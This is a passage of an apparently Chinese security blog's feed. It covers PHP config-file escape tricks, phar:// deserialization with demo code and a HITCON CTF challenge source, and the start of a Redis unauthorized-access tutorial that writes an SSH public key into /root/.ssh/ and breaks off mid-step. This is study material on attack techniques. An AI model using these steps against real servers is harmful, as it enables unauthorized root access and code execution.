src="http://ww1.sinaimg.cn/large/de75fd55gy1g4vohoey00j20i202gweg.jpg" alt></p><p>成功写到下一行，但<code>&#39;</code> 还是被转义了，问题不大，再替换下就行。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4voickhwej20hy02gdfr.jpg" alt></p><h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h2><p>正常转义</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dofwyyudj20hb021q2v.jpg" alt></p><p>成功逃逸</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g5dofc393wj20hd022q2u.jpg" alt></p><h2 id="后向引用"><a href="#后向引用" class="headerlink" title="后向引用"></a>后向引用</h2><p>这思路是真的牛逼，下面的 <code>replacement</code> 就是说第二个参数。</p><blockquote><p><code>replacement</code> 中可以包含后向引用 <em>\n</em> 或 <em>$n</em>，语法上首选后者。 每个 这样的引用将被匹配到的第 n 个捕获子组捕获到的文本替换。 n 可以是 0-99，<em>\0</em> 和 <em>$0</em> 代表完整的模式匹配文本。 捕获子组的序号计数方式为：代表捕获子组的左括号从左到右， 从 1 开始数。</p></blockquote><p>构造一个</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4vqxix006j20gc025a9z.jpg" alt></p><p>再来一下，使用 <code>$0</code> 或者 <code>\0</code>。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g4vqyanufnj20gb02b0sn.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;以下内容是对 wonderkun 师傅这篇 &lt;a href=&quot;https://blog.wonderkun.cc/2017/02/28/php%E5%86%99%E5%85%A5%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%9A%84%E7
      
    
    </summary>
    
    
      <category term="php" scheme="https://wywwzjj.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>phar 与反序列化学习</title>
    <link href="https://wywwzjj.top/2019/05/18/Phar-%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    <id>https://wywwzjj.top/2019/05/18/Phar-与反序列化学习/</id>
    <published>2019-05-18T09:45:39.000Z</published>
    <updated>2019-11-26T05:13:57.187Z</updated>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="与普通反序列化利用有什么区别？"><a href="#与普通反序列化利用有什么区别？" class="headerlink" title="与普通反序列化利用有什么区别？"></a>与普通反序列化利用有什么区别？</h3><p>在 PHP 下利用反序列化漏洞的时候，通常走这样的一条路线：</p><p><strong>反序列化点 =&gt; 可利用函数 =&gt; 构造反序列化 POP 链</strong></p><p>但在 2018 年的 Black Hat 上，安全研究员 Sam Thomas 指出了一条新思路：</p><p>在<strong>文件系统函数</strong> （ file_get_contents 、 unlink 等）参数可控的情况下，配合 <strong>phar:// 伪协议</strong> ，可以不依赖反序列化函数 <code>unserialize()</code> 直接进行反序列化的操作。</p><h3 id="phar-是什么？"><a href="#phar-是什么？" class="headerlink" title="phar 是什么？"></a>phar 是什么？</h3><p><a href="https://www.php.net/manual/en/phar.using.intro.php" target="_blank" rel="noopener">官方文档</a> 给出了详细的解释。概括来说，有如下<strong>特点</strong>：</p><ul><li><p>Phar 存档在概念上类似于 Java JAR 存档，但是根据 PHP 应用程序的需求和灵活性进行了定制。</p></li><li><p>Phar 可以把多个文件归档到同一个文件中，不经过解压就能被 PHP 访问并执行。</p></li><li><p>Meta-data can be any PHP variable that can be serialized.</p></li></ul><p>最后一点尤其重要，有序列化就有反序列。</p><blockquote><p>This meta-data is unserialized when a Phar archive is first accessed by any(!) file operation. </p><p>This opens the door to unserialization attacks whenever a file operation occurs on a path whose<br>beginning is controlled by an attacker.</p></blockquote><p>再看一下 phar 的<strong>文件结构</strong>。</p><blockquote><p>The phar file format is literally laid out as stub / manifest / contents / signature, and stores the crucial information of what is included in the phar archive in its <em>manifest</em>.</p></blockquote><p>也就是说分为四个部分：</p><ul><li><p>stub</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Phar::mapPhar();</span><br><span class="line"><span class="keyword">include</span> <span class="string">'phar://myphar.phar/index.php'</span>;</span><br><span class="line"><span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br></pre></td></tr></table></figure><p>  可以当做一个标志来理解，正如上面写的这样，必须以 <code>_HALT_COMPILER();</code> 结尾。所以在设置 <code>stub</code> 时，也要有 <code>__HALT_COMPILER();</code> ，这里的设置就相当灵活了，你可以随便插数据 。比如：</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xxx;<span class="comment"><span class="keyword">__HALT_COMPILER</span>();</span></span><br><span class="line"><span class="comment">// 需要提醒的是 &lt;?php ?&gt; 并不是必须的，以 ; 隔开即可，可避开检测 &lt;? 的情况</span></span><br></pre></td></tr></table></figure></li><li><p>manifest</p><p>  phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的 meta-data，这是上述攻击手法最核心的地方。</p><p>  <img src="http://ww1.sinaimg.cn/large/de75fd55gy1g385zk9pc4j20np0a775m.jpg" alt></p></li><li><p>contents：被压缩文件的内容。</p></li><li><p>signature：签名，放在文件末尾。</p></li></ul><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p>用个小 Demo 来测试一下反序列化（注意要将 php.ini 中的 phar.readonly 选项设置为 0，否则无法生成）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// phar_gen.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pp = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct was called!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">ini_set(<span class="string">'phar.readonly'</span>,<span class="string">"Off"</span>);</span><br><span class="line">    @unlink(<span class="string">"test.phar"</span>);</span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">"test.phar"</span>);  <span class="comment">// 后缀名必须为phar，生成后可随意修改</span></span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">"2333;__HALT_COMPILER();"</span>);  <span class="comment">// 设置stub</span></span><br><span class="line"><span class="comment">// $p-&gt;compressFiles(Phar::GZ);  // 可设置压缩包，使用时照旧</span></span><br><span class="line">    $p-&gt;setMetadata(<span class="keyword">new</span> Test());  <span class="comment">// 将自定义的 meta-data 存入 manifest</span></span><br><span class="line">    $p-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);  <span class="comment">// 添加要压缩的文件</span></span><br><span class="line">    <span class="comment">// 签名自动计算</span></span><br><span class="line">    $p-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到 meta-data 在 phar 中的存在形式</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g386hud6grj20hj070jsn.jpg" alt></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dese_phar.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $pp = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"destruct was called!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = <span class="string">'phar://test.phar/1'</span>;  <span class="comment">// 这里访问的文件存在与否都不重要</span></span><br><span class="line">    file_get_contents($filename);</span><br></pre></td></tr></table></figure><p>可以看到析构函数被成功调用</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g386lyrg9aj20ki036mxg.jpg" alt></p><p>seaii 师傅给出了函数列表</p><p><img src="https://images.seebug.org/content/images/2018/08/17c4c630-b5f7-4e02-af48-160cd8fcf73a.png-w331s" alt></p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>这里不得不提 orange 在 hitcon 2017 出的 <code>baby^h-master-php-2017</code>，本题可以通过 <a href="http://117.50.3.97:8005/" target="_blank" rel="noopener">i 春秋平台复现</a>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$FLAG = create_function(<span class="string">""</span>, <span class="string">'die(`/read_flag`);'</span>);</span><br><span class="line">$SECRET = `/read_secret`;</span><br><span class="line">$SANDBOX = <span class="string">"/var/www/data/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@chdir($SANDBOX);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;</span><br><span class="line">$data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">$hmac = hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET);</span><br><span class="line">setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $avatar;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;avatar = $path;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 猜测执行 FLAG() 出 flag</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span> <span class="keyword">extends</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$random = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function my_function_$random() &#123;"</span></span><br><span class="line">. <span class="string">"  global \$FLAG; \$FLAG();"</span></span><br><span class="line">. <span class="string">"&#125;"</span>);</span><br><span class="line"><span class="comment">// 难道要爆破？</span></span><br><span class="line">$_GET[<span class="string">"lucky"</span>]();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $SECRET;</span><br><span class="line">$data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line"><span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!hash_equals(hash_hmac(<span class="string">"sha1"</span>, $data, $SECRET), $hmac)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化点，但无法更改 session 的值</span></span><br><span class="line">$data = unserialize($data);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($data-&gt;avatar)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $data-&gt;avatar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="comment">// vps 准备好 phar 文件</span></span><br><span class="line">$data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);</span><br><span class="line"><span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line"><span class="comment">// 这两个函数都将造成反序列化</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists($path . <span class="string">"/avatar.gif"</span>)) &#123;</span><br><span class="line">$path = <span class="string">"/var/www/html"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Content-Type: image/gif"</span>);</span><br><span class="line"><span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">"upload"</span>) &#123;</span><br><span class="line">upload(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>) &#123;</span><br><span class="line">show(check_session());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外还有：</p><ul><li><p>护网杯 easy laravel</p></li><li><p>code-breaking lumenserial</p></li></ul><h2 id="相关绕过"><a href="#相关绕过" class="headerlink" title="相关绕过"></a>相关绕过</h2><p>TODO</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/resource=phar://phar.phar</span></span><br></pre></td></tr></table></figure><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>来看一下源码  <a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618" target="_blank" rel="noopener">php-src/ext/phar/phar.c:618</a>，调用了 <code>php_var_unserialize</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!php_var_unserialize(metadata, &amp;p, p + zip_metadata_len, &amp;var_hash)) &#123;</span><br></pre></td></tr></table></figure><p>太忙了，有时间深入分析一下。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/38</a></p><p><a href="https://blog.szfszf.top/tech/phar%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://blog.szfszf.top/tech/phar%E5%8D%8F%E8%AE%AE%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p><a href="http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/11/07/重新认识反序列化-Phar/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;h3 id=&quot;与普通反序列化利用有什么区别？&quot;&gt;&lt;a href=&quot;#与普通反序列化利用有什么区别？&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Redis 未授权访问相关利用</title>
    <link href="https://wywwzjj.top/2019/05/17/Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%85%B3%E5%88%A9%E7%94%A8/"/>
    <id>https://wywwzjj.top/2019/05/17/Redis-未授权访问相关利用/</id>
    <published>2019-05-17T13:49:23.000Z</published>
    <updated>2019-12-08T05:40:18.644Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Redis-介绍"><a href="#Redis-介绍" class="headerlink" title="Redis 介绍"></a>Redis 介绍</h2><h3 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h3><p>Redis 是一个开源（BSD许可）的，内存中的数据结构存储系统，它可以用作数据库、缓存和消息中间件。 它支持多种类型的数据结构，如 <a href="http://www.redis.cn/topics/data-types-intro.html#strings" target="_blank" rel="noopener">字符串（strings）</a>， <a href="http://www.redis.cn/topics/data-types-intro.html#hashes" target="_blank" rel="noopener">散列（hashes）</a>， <a href="http://www.redis.cn/topics/data-types-intro.html#lists" target="_blank" rel="noopener">列表（lists）</a>， <a href="http://www.redis.cn/topics/data-types-intro.html#sets" target="_blank" rel="noopener">集合（sets）</a>， <a href="http://www.redis.cn/topics/data-types-intro.html#sorted-sets" target="_blank" rel="noopener">有序集合（sorted sets）</a> 与范围查询， <a href="http://www.redis.cn/topics/data-types-intro.html#bitmaps" target="_blank" rel="noopener">bitmaps</a>， <a href="http://www.redis.cn/topics/data-types-intro.html#hyperloglogs" target="_blank" rel="noopener">hyperloglogs</a> 和 <a href="http://www.redis.cn/commands/geoadd.html" target="_blank" rel="noopener">地理空间（geospatial）</a> 索引半径查询。 Redis 内置了 <a href="http://www.redis.cn/topics/replication.html" target="_blank" rel="noopener">复制（replication）</a>，<a href="http://www.redis.cn/commands/eval.html" target="_blank" rel="noopener">LUA脚本（Lua scripting）</a>， <a href="http://www.redis.cn/topics/lru-cache.html" target="_blank" rel="noopener">LRU驱动事件（LRU eviction）</a>，<a href="http://www.redis.cn/topics/transactions.html" target="_blank" rel="noopener">事务（transactions）</a> 和不同级别的 <a href="http://www.redis.cn/topics/persistence.html" target="_blank" rel="noopener">磁盘持久化（persistence）</a>， 并通过 <a href="http://www.redis.cn/topics/sentinel.html" target="_blank" rel="noopener">Redis哨兵（Sentinel）</a>和自动 <a href="http://www.redis.cn/topics/cluster-tutorial.html" target="_blank" rel="noopener">分区（Cluster）</a>提供高可用性（high availability）。</p><p><img src="https://ws1.sinaimg.cn/large/de75fd55gy1g35u4fne4fj20ju0jeae1.jpg" alt></p><p>Redis 主要将数据存在内存中，缓存作用实际高于存储作用，随时可执行 <code>save</code> 命令将当前内存里的数据存入硬盘中。如果需要恢复数据，只需将备份文件 <code>dump.rdb</code> 移动到 redis 安装目录并启动服务即可。通常看，将数据放在内存中是不安全的，一旦发生断电或者机器故障， 重要的数据可能就会丢失，因此 Redis 提供了两种持久化方式：RDB 和 AOF，即可以用两种策略将内存的数据保存到硬盘中，这样就保证了数据的可持久性。</p><p>还有个重要特点，其所有操作都是原子性的，要么成功执行，要么完全不执行。</p><h3 id="能做什么？"><a href="#能做什么？" class="headerlink" title="能做什么？"></a>能做什么？</h3><ul><li><strong>缓存</strong><br>  缓存机制几乎在所有的大型网站都有使用，合理地使用缓存不仅可以加 快数据的访问速度，而且能够有效地降低后端数据源的压力。Redis 提供了键值过期时间设置，并且也提供了灵活控制最大内存和内存溢出后的淘汰策略。可以这么说，一个合理的缓存设计能够为一个网站的稳定保驾护航。</li><li><strong>排行榜系统</strong><br>  排行榜系统几乎存在于所有的网站，例如按照热度排名的排行榜，按照发布时间的排行榜，按照各种复杂维度计算出的排行榜，Redis 提供了列表和有序集合数据结构，合理地使用这些数据结构可以很方便地构建各种排行榜系统。</li><li><strong>计数器应用</strong><br>  计数器在网站中的作用至关重要，例如视频网站有播放数、电商网站有 浏览数，为了保证数据的实时性，每一次播放和浏览都要做加 1 的操作，如果并发量很大对于传统关系型数据的性能是一种挑战。Redis 天然支持计数功能而且计数的性能也非常好，可以说是计数器系统的重要选择。</li><li><strong>社交网络</strong><br>  赞/踩、粉丝、共同好友/喜好、推送、下拉刷新等是社交网站的必备功能，由于社交网站访问量通常比较大，而且传统的关系型数据不太适合保存这种类型的数据，Redis提供的数据结构可以相对比较容易地实现这些功<br>  能。</li><li><strong>消息队列系统</strong><br>  消息队列系统可以说是一个大型网站的必备基础组件，因为其具有业务 解耦、非实时业务削峰等特性。Redis提供了发布订阅功能和阻塞队列的功能，虽然和专业的消息队列比还不够足够强大，但是对于一般的消息队列功能基本可以满足。</li></ul><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>你可以在这做做实验 <a href="http://try.redis.io/" target="_blank" rel="noopener">http://try.redis.io/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动 redis</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-server</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开客户端（交互模式）</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-cli</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">ping  <span class="comment"># 测试是否启动</span></span></span><br><span class="line">=&gt; pong # 则成功</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 远程连接</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-cli -h host -p port -a password</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 执行命令</span></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-cli -h 127.0.0.1-p 6379 get hello</span></span><br><span class="line">"world"</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">redis-cli -r 3 ping  <span class="comment"># -r 将命令重复执行多次，[-i 3 则是每三秒执行一次命令]</span></span></span><br><span class="line">PONG</span><br><span class="line">PONG</span><br><span class="line">PONG</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"><span class="built_in">echo</span> <span class="string">"world"</span> |redis-cli -x <span class="built_in">set</span> hello  <span class="comment"># -x 从标准输入作为该命令的最后一个参数</span></span></span><br><span class="line">Ok</span><br><span class="line"></span><br><span class="line">info# 提供服务器的信息和统计</span><br><span class="line">flushall # 删除所有数据库内容</span><br><span class="line">flushdb# 刷新数据库</span><br><span class="line">set test "test" # 设置变量</span><br><span class="line">config set dir dirpath # 设置路径等配置</span><br><span class="line">config get xxx# 获取动态配置信息</span><br><span class="line">save # 将内存中的数据保存到硬盘中</span><br><span class="line">get var</span><br><span class="line">select 2# 选择 2 号数据库，默认有 16 个数据库</span><br><span class="line">del key  # 删除返回 1</span><br><span class="line">exists key # 检查 key 是否存在</span><br><span class="line">expire key seconds # 给 key 设置过期时间（秒）</span><br><span class="line">expireat key timestamp# 设置过期时间（时间戳）</span><br><span class="line">keys pattern# 查找符合模式的 key，用 ? * 模糊匹配</span><br><span class="line">move key db# 将当前数据库 key 移动到数据库 db 中</span><br><span class="line">persist key# 移除过期时间，key 持续有效</span><br><span class="line">pttl key# 返回 key 剩余生存时间（毫秒）</span><br><span class="line">ttl key # 返回 key 剩余生存时间（秒）</span><br><span class="line">randomkey# 随机返回一个 key</span><br><span class="line">rename key newkey# 重命名</span><br><span class="line">renamex key newkey# 仅当 newkey 不存在时重命名</span><br><span class="line">type key# 获取类型</span><br><span class="line">dump key# 序列化</span><br></pre></td></tr></table></figure><h2 id="非授权访问"><a href="#非授权访问" class="headerlink" title="非授权访问"></a>非授权访问</h2><p><strong>为什么会出现非授权访问？</strong></p><p>设计哲学？以 root 权限运行？</p><blockquote><p> 以下利用都是基于 redis 的持久化进行的任意文件写入，其他玩法可以自己开开脑洞。</p></blockquote><h3 id="写公钥直接-ssh-连接"><a href="#写公钥直接-ssh-连接" class="headerlink" title="写公钥直接 ssh 连接"></a>写公钥直接 ssh 连接</h3><p>本地生成公私钥文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh-keygen –t rsa</span></span><br></pre></td></tr></table></figure><p>将公钥写入 key.txt 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> (<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; key.txt</span></span><br></pre></td></tr></table></figure><p>连接 Redis 写入文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat key.txt | redis-cli -h 127.0.0.1 -x <span class="built_in">set</span> key</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> redis-cli -h 127.0.0.1</span></span><br><span class="line">127.0.0.1:6379&gt; config set dir /root/.ssh/</span><br><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line">1) "dir"</span><br><span class="line">2) 